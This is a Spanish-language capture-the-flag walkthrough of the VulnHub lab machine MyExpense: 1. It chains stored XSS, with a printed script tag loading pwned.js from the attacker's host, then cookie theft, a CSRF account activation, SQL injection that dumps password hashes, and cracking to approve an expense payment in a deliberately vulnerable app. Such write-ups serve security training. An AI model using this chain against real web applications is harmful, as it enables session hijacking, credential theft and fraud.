___

```
- Url: https://www.vulnhub.com/entry/myexpense-1,405/
- Name: MyExpense: 1
- Date release: 7 Dec 2019
- Author: [Sh4rpf0rc3](https://www.vulnhub.com/author/sh4rpf0rc3,662/)
- Series: [MyExpense](https://www.vulnhub.com/series/myexpense,265/)

___

VM Scenario:
<p>
	You are "Samuel Lamotte" and you have just been fired by your company "Furtura Business Informatique". Unfortunately because of your hasty departure, you did not have time to validate your expense report for your last business trip, which still amounts to 750 € corresponding to a return flight to your last customer.
	
	Fearing that your former employer may not want to reimburse you for this expense report, you decide to hack into the internal application called **"MyExpense "** to manage employee expense reports.
	
	So you are in your car, in the company carpark and connected to the internal Wi-Fi (the key has still not been changed after your departure). The application is protected by username/password authentication and you hope that the administrator has not yet modified or deleted your access.
	
	Your credentials were: samuel/fzghn4lw
	
	Once the challenge is done, the flag will be displayed on the application while being connected with your (samuel) account.
</p>
```
___

Descargamos la máquina virtual y la abrimos en mi caso con vmware, además habría que cambiar el nombre de las interfaces y la ruta host:

```
Restart VM
Tecla E
	Cambiar (ro quiet) --> (rw init=/bin/bash)
Ctrl+X
cd /opt
	cambiar la dirección de host de todos los archivos .py por la dirección correcta; en mi caso host = "http://192.168.1.22/"
cd /etc/network
	nano interfaces --> cambiar la interfaz por la correcta; en mi caso ens33
```

Comprobamos la conectividad con la máquina vulnerable:

<img width="702" height="81" alt="image" src="https://github.com/user-attachments/assets/fa42f70f-5b2a-48b0-9db5-ad50871abfff" />

Comprobamos el sistema operativo al que nos enfrentamos, en este caso Linux:

<img width="559" height="96" alt="image" src="https://github.com/user-attachments/assets/5f18e446-381a-4c8f-b342-7ce595784b70" />

Creamos nuestros directorios de trabajo:

<img width="764" height="177" alt="image" src="https://github.com/user-attachments/assets/690a95c2-d9eb-4bff-8e22-d9e925d33805" />

Realizamos un escaneo de puertos con nmap:

<img width="794" height="45" alt="image" src="https://github.com/user-attachments/assets/e449c19b-0afd-4602-8053-1369347149e7" />

Extraemos los puertos abiertos:

<img width="712" height="282" alt="image" src="https://github.com/user-attachments/assets/ecfc4b81-d2ea-4123-b323-36e58ae22cde" />

Realizamos un escaneo de servicios con nmap de los puertos abiertos:

<img width="699" height="44" alt="image" src="https://github.com/user-attachments/assets/f6db8665-28f4-4d07-8f03-906e4212f1a1" />

Resultado escaneo de servicios de los puertos abiertos:

<img width="961" height="424" alt="image" src="https://github.com/user-attachments/assets/881939f3-6de9-430c-9de3-8d19f7087fcd" />

Accedemos a la web:

<img width="1303" height="547" alt="image" src="https://github.com/user-attachments/assets/5e97cafb-e437-40da-85d0-509eb8da7f13" />

Probamos a loguearnos con las credenciales que se nos proporcionaron del usuario Samuel nombre+password:

<img width="426" height="239" alt="image" src="https://github.com/user-attachments/assets/dd3332bc-20c9-4564-8c69-db3e229d1a5e" />

Y vemos que no podemos acceder con ellas:

<img width="531" height="67" alt="image" src="https://github.com/user-attachments/assets/43ba0630-c085-4e23-b3cd-61dde010c5d4" />

Realizamos un fuzzing para encontrar posibles directorios y/o archivos:

<img width="1215" height="556" alt="image" src="https://github.com/user-attachments/assets/38f450f6-edba-4caf-8b09-0d81afef83cb" />

En el resultado de gobuster vemos un directorio llamado /admin, por lo que probamos a acceder a él, aunque nos salta un mensaje de error 403:

<img width="771" height="124" alt="image" src="https://github.com/user-attachments/assets/a33af852-6b43-47cb-be0d-e1046acdbe05" />

Mediante wappalyzer podemos ver que la web usa php:

<img width="890" height="395" alt="image" src="https://github.com/user-attachments/assets/dcc35529-0172-4418-9417-a6cf596d4197" />

Por lo que podemos probar a fuzzear por archivos de extensión .php, vemos que se ha encontrado un archivo admin.php en el directorio admin:

<img width="1339" height="513" alt="image" src="https://github.com/user-attachments/assets/b5e4a480-6d46-4b55-856b-578a13100714" />

Ahora logramos acceder al archivo y visualizarlo:

<img width="1389" height="723" alt="image" src="https://github.com/user-attachments/assets/ceb95b39-131b-4227-825f-a7e49086dfa7" />

Además podemos ver el nombre de usuario de Samuel que no teníamos anteriormente:

<img width="1066" height="48" alt="image" src="https://github.com/user-attachments/assets/00036064-14e2-40ab-855e-62a30b494337" />

Si intentamos activar el usuario Samuel, no nos deja:

<img width="796" height="358" alt="image" src="https://github.com/user-attachments/assets/71f845bc-437c-4656-9e7a-b01abd31a69a" />

Si esta vez intentamos loguearnos con el nombre de usuario correcto, vemos que nos salta un mensaje distinto, que la cuenta esta bloqueada/inactiva:

<img width="571" height="83" alt="image" src="https://github.com/user-attachments/assets/4d81137f-4355-4fca-a197-9ae9205a409e" />

Intentamos crearnos un usuario para pruebas:

```
user: fmoha
pass: fmoha1234
site: Paris
mail: fmoha@mail.com
Firstname: Theo
Lastname: Rodriguez
```

Al intentar guardarlo no salta un mensaje de error:

<img width="1197" height="89" alt="image" src="https://github.com/user-attachments/assets/f07ade7f-ac89-410b-afea-e690946f88a8" />

Pero si inspeccionamos el botón de Sign Up vemos que tiene el parámetro disabled que bloquea el registro el cual si quitamos podemos registrarnos correctamente:

<img width="633" height="81" alt="image" src="https://github.com/user-attachments/assets/17eee67c-1007-4e31-bee2-48110d9e5f89" />

<img width="458" height="73" alt="image" src="https://github.com/user-attachments/assets/a337fee9-0438-40c4-b2c9-97077b65dc92" />

Vemos en el panel de admin.php que se ha agregado nuestra cuenta aunque está deshabilitada:

<img width="1418" height="75" alt="image" src="https://github.com/user-attachments/assets/5ac7c133-f1ed-45fb-ab6c-b7e27202614e" />

Si esta vez probamos a crear una cuenta pero esta vez agregamos en los campos de firstname y lastname unas etiquetas script y guardamos el usuario:

<img width="831" height="590" alt="image" src="https://github.com/user-attachments/assets/e1da4c89-fabb-4744-bb12-6f0e1353e8b4" />

Vemos que en el panel de usuarios de admin.php salta una alerta, por lo que es vulnerable a XSS:

<img width="1162" height="486" alt="image" src="https://github.com/user-attachments/assets/dfdfa6b8-096c-430d-b291-4a1011bde381" />

Sabiendo que la web es vulnerable a XSS podemos intentar robar la cookie de algún usuario que visite/use la web regularmente.

Para empezar montamos un servidor HTTP:

<img width="688" height="104" alt="image" src="https://github.com/user-attachments/assets/93583418-843e-46b4-b73e-0a1122df24c0" />

Volvemos a crear un usuario de prueba, y en el XSS agregamos un src de un archivo que no existe de momento solo para comprobar si llegan peticiones:

<img width="941" height="583" alt="image" src="https://github.com/user-attachments/assets/96f7f043-5c6a-4b72-9fc1-0c9c6129d953" />

```
<script src="http://192.168.1.12:80/pwned.js"></script>
```

Vemos que se generan peticiones sin hacer falta que se recargue la página de admin por lo que hay algún usuario activo regularmente con acceso al que podemos intentar robarle su cookie:

<img width="744" height="186" alt="image" src="https://github.com/user-attachments/assets/ab37e8ee-7ae5-4917-bf9c-f87df8875e9b" />

Creamos un script pwned.js en JS:

<img width="744" height="102" alt="image" src="https://github.com/user-attachments/assets/866d9068-69a3-46a3-8ca6-40a38983d57a" />

Si montamos un servidor http con python vemos que capturamos la cookie de un usuario:

<img width="1092" height="109" alt="image" src="https://github.com/user-attachments/assets/9cac2207-3266-4cf7-9896-841ecd4f97cd" />

Sustituimos la cookie que tuviesemos por la que acabamos de capturar:

<img width="787" height="117" alt="image" src="https://github.com/user-attachments/assets/ba7f7b7c-747f-49e4-a050-b6e15bc16d34" />

Si recargamos la página de /admin/admin.php nos salta un error de que solo puede haber una cuenta autenticada a la vez.

<img width="650" height="70" alt="image" src="https://github.com/user-attachments/assets/03b49102-fbb8-4755-b13d-4ee51d2d4430" />

Viendo que no podemos reutilizar la cookie, vamos a probar a usar un ataque CSRF:

Viendo la url al intentar activar el usuario samuel vemos que usar GET:

<img width="662" height="79" alt="image" src="https://github.com/user-attachments/assets/d5f3bb69-bccf-4148-ac06-ffe646be9cdf" />

Por lo que podemos modificar el script pwned.js para que el usuario haga una petición a la URL especificada por nosotros:

<img width="937" height="95" alt="image" src="https://github.com/user-attachments/assets/ac9f916c-2e92-4081-8a4c-8cd3217371be" />

Comprobamos el servidor http y captura una petición GET:

<img width="845" height="108" alt="image" src="https://github.com/user-attachments/assets/56f11fd9-42b8-4512-95d7-afc70dcd905f" />

Si recargamos la página del admin podemos ver que el usuario samuel está activado:

<img width="1041" height="52" alt="image" src="https://github.com/user-attachments/assets/f49f8450-92fc-4b07-896b-1a0a79183cbc" />

Si probamos a loguearnos ahora como samuel si nos deja:

<img width="980" height="536" alt="image" src="https://github.com/user-attachments/assets/96962183-e488-4394-9c6e-5a4c10a84ba3" />

Si probamos a enviar el reporte que el deben a samuel:

<img width="753" height="174" alt="image" src="https://github.com/user-attachments/assets/b4cee88e-7ca5-4eea-b388-3bd46b22ab89" />

Nos salta un mensaje de que se ha enviado correctamente pero no se ha aceptado:

<img width="957" height="277" alt="image" src="https://github.com/user-attachments/assets/93b676cc-a20e-4a0d-bbed-438696db494c" />

Si vemos la información personal de samuel, vemos que el usuario Manon es el manager de samuel:

<img width="872" height="557" alt="image" src="https://github.com/user-attachments/assets/4ebd481d-f22f-4b9b-a6b2-4d4138466796" />

Desde el panel de admin vemos que el usuario Manon existe y esta activo:

<img width="1136" height="57" alt="image" src="https://github.com/user-attachments/assets/d5bd8847-3dc2-45f2-bf40-a58d4f0b39b8" />

Si vemos los comentarios, vemos varios usuarios.

Si modificamos el script JS para intentar capturar las cookies de los usuarios:

<img width="860" height="112" alt="image" src="https://github.com/user-attachments/assets/8dc42bd7-07eb-41e7-bf51-421f2036acbd" />

<img width="1070" height="297" alt="image" src="https://github.com/user-attachments/assets/e96b37dc-3629-4a7c-b5f4-627b50a3613c" />

Nos montamos un servidor HTTP por el puerto 4646

Enviamos la petición XSS

En el servidor HTTP capturamos varias cookies de sesión

Si probamos a loguearnos con las cookies vemos que la cookie 1tql6to5.... corresponde con el usuario Manon Riviere el cual tiene una pestaña llamada Renee.

Además podremos aceptar la solicitud que enviamos antes como usuario Samuel. Pero la petición solo está validada, ahora hay que buscar una forma de aceptarla.

Si vemos las opciones del usuario Manon vemos que su superior es un tal usuario Paul Baudouin el cual tiene el rol de Aprobador Financiero por lo que seguramente pueda aceptar la solicitud de Samuel.

Si nos fijamos en la url del panel de rennes del usuario Manon:

<img width="231" height="41" alt="image" src="https://github.com/user-attachments/assets/28b71301-4fe5-42cb-8334-ae47b75bd3a6" />

Podemos probar si es vulnerable a SQLi, y vemos que si lo es:

<img width="317" height="35" alt="image" src="https://github.com/user-attachments/assets/e2b257bf-6409-4215-ab59-6a114c11baf7" />

<img width="1150" height="150" alt="image" src="https://github.com/user-attachments/assets/23f36a39-68c3-4062-ab60-2ae46eb1d2c2" />

<img width="633" height="47" alt="image" src="https://github.com/user-attachments/assets/d0b97993-0e20-4ef2-a3b7-ed100b4fc6dd" />

<img width="541" height="126" alt="image" src="https://github.com/user-attachments/assets/da8e4db6-9fcb-42d9-8be7-dedbbf852ef9" />

Tras varias pruebas conseguimos sacar los usuarios y contraseñas de la base de datos:

<img width="619" height="45" alt="image" src="https://github.com/user-attachments/assets/ce0b30a3-e326-4514-b508-cde8e9d4d74e" />

<img width="1215" height="146" alt="image" src="https://github.com/user-attachments/assets/74c21cb6-b929-401b-b8e9-32f6313d49b1" />

De momento solo necesitamos el usuario pbaudouin:

<img width="524" height="112" alt="image" src="https://github.com/user-attachments/assets/fc219e8c-0c5f-44ba-b3ea-275f03c4a3c1" />

Si probamos a crackearla mediante CrackStation vemos que nos saca la password:

<img width="1032" height="391" alt="image" src="https://github.com/user-attachments/assets/51b51239-cb75-4653-bb74-9fc711cadc19" />

Si intentamos loguearnos nos deja, nos movemos al panel de expense reports donde podremos ver las solicitudes pendientes, entre las cuales se encuentra la del usuario Manon que enviamos anteriormente.

Aceptamos el pago de la petición.

Si nos logueamos de nuevo como Samuel para comprobar el pago nos salta la flag final : ``flag{H4CKY0URL1F3}``

___
